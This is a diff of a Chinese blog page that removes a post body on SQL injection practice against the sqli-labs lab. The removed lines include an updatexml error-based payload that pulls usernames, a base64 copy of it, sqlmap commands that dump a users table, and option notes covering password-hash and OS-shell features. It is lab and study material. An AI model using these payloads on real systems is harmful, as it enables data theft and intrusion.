-<p>-1’and updatexml(1,concat(0x7e,mid((select group_concat(username) from (select username from users)a),32,32)),1) or’</p>
-<p>LTEnYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLG1pZCgoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSkgZnJvbSAoc2VsZWN0IHVzZXJuYW1lIGZyb20gdXNlcnMpYSksMzIsMzIpKSwxKSBvcic&#x3D;</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251201616.png"></p>
-<p>将编码直接复制到uname上面，直接就可以查询</p>
-<p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202312251201183.png"></p>
-<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><blockquote>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.78/sqli/Less-1/?id=1">http://192.168.2.78/sqli/Less-1/?id=1</a>“ –dbs –batch</p>
-<p>python sqlmap.py  -u “<a target="_blank" rel="noopener" href="http://192.168.2.70/sqli/Less-1/?id=1">http://192.168.2.70/sqli/Less-1/?id=1</a>“  –batch -D security -T users -C “id,username” –dump</p>
-<p>python sqlmap.py -r ..&#x2F;1.txt –batch –risk&#x3D;3 –level&#x3D;3 –dbs</p>
-<p>1.txt是发的包，..&#x2F;是上一级</p>
-</blockquote>
-<p><strong>SQLMap 使用说明笔记</strong></p>
-<p><strong>基础命令:</strong></p>
-<ul>
-<li><strong>sqlmap.py       主程序</strong></li>
-</ul>
-<p><strong>基本选项:</strong></p>
-<ul>
-<li><strong>-h, –help      显示简短帮助信息并退出</strong></li>
-<li><strong>-hh          显示完整帮助信息并退出</strong></li>
-<li><strong>–version       显示程序的版本号并退出</strong></li>
-<li><strong>-v VERBOSE      设置详细级别（0至6，默认为1）</strong></li>
-</ul>
-<p><strong>目标定义:</strong></p>
-<ul>
-<li><strong>-u URL, –url&#x3D;URL   设置目标URL（例：”<a target="_blank" rel="noopener" href="http://www.site.com/vuln.php?id=1%22%EF%BC%89">http://www.site.com/vuln.php?id=1&quot;）</a></strong></li>
-<li><strong>-g GOOGLEDORK     使用Google dork结果作为目标URL</strong></li>
-</ul>
-<p><strong>请求参数:</strong></p>
-<ul>
-<li><strong>–data&#x3D;DATA      发送POST数据（例：”id&#x3D;1”）</strong></li>
-<li><strong>–cookie&#x3D;COOKIE    设置HTTP Cookie值（例：”PHPSESSID&#x3D;a8d127e..”）</strong></li>
-<li><strong>–random-agent    使用随机用户代理</strong></li>
-<li><strong>–proxy&#x3D;PROXY     设置使用的代理（例：”<a target="_blank" rel="noopener" href="http://127.0.0.1:8080"）">http://127.0.0.1:8080&quot;）</a></strong></li>
-<li><strong>–tor         通过Tor网络发送请求</strong></li>
-<li><strong>–check-tor      检查Tor是否被正确配置</strong></li>
-</ul>
-<p><strong>测试注入:</strong></p>
-<ul>
-<li><strong>-p TESTPARAMETER   设置用于测试的参数</strong></li>
-<li><strong>–dbms&#x3D;DBMS      设定后端数据库类型（例：”MySQL”）</strong></li>
-</ul>
-<p><strong>检测选项：</strong></p>
-<ul>
-<li><strong>–level&#x3D;LEVEL     设置检测级别（1至5，默认为1）</strong></li>
-<li><strong>–risk&#x3D;RISK      设定测试风险级别（1至3，默认为1）</strong></li>
-</ul>
-<p><strong>注入技术:</strong></p>
-<ul>
-<li><strong>–technique&#x3D;TECH   设置使用的SQL注入技术（默认：”BEUSTQ”）</strong></li>
-</ul>
-<p><strong>数据库枚举:</strong></p>
-<ul>
-<li><strong>-a, –all       枚举一切信息</strong></li>
-<li><strong>-b, –banner     查找DBMS标识</strong></li>
-<li><strong>–current-user    查找当前数据库用户</strong></li>
-<li><strong>–current-db     查找当前数据库</strong></li>
-<li><strong>–passwords      枚举用户密码哈希</strong></li>
-<li><strong>–dbs         枚举数据库</strong></li>
-<li><strong>–tables       枚举数据库表</strong></li>
-<li><strong>–columns       枚举表列</strong></li>
-<li><strong>–schema       枚举数据库架构</strong></li>
-<li><strong>–dump        转储表数据</strong></li>
-<li><strong>–dump-all      转储所有数据库表数据</strong></li>
-<li><strong>-D DB         指定数据库进行枚举</strong></li>
-<li><strong>-T TBL        指定表进行枚举</strong></li>
-<li><strong>-C COL        指定列进行枚举</strong></li>
-</ul>
-<p><strong>操作系统访问:</strong></p>
-<ul>
-<li><strong>–os-shell      提示交互式操作系统shell</strong></li>
-<li><strong>–os-pwn       获取OOB shell（例如：Meterpreter）</strong></li>
-</ul>
-<p><strong>一般设置:</strong></p>
-<ul>
-<li><strong>–batch        批处理模式，无需用户交互</strong></li>
-<li><strong>–flush-session    清除当前目标的会话缓存</strong></li>
-</ul>
-<p><strong>杂项:</strong></p>
-<ul>
-<li><strong>–wizard       简易向导模式</strong></li>
-</ul>
-<p><strong>注意:</strong></p>
-<ul>
-<li><strong>使用’-hh’可以查看所有选项的详细列表</strong></li>
-<li><strong>若sqlmap提示版本过时，应考虑更新至最新版本</strong></li>
-</ul>
-
+          <p>此篇介绍了一些注入的不同方式，字符型注入，数字型注入，header注入，报错注入，cookies注入，sqlmap的使用</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/12/25/sql%E6%B3%A8%E5%85%A5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1226,13 +992,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
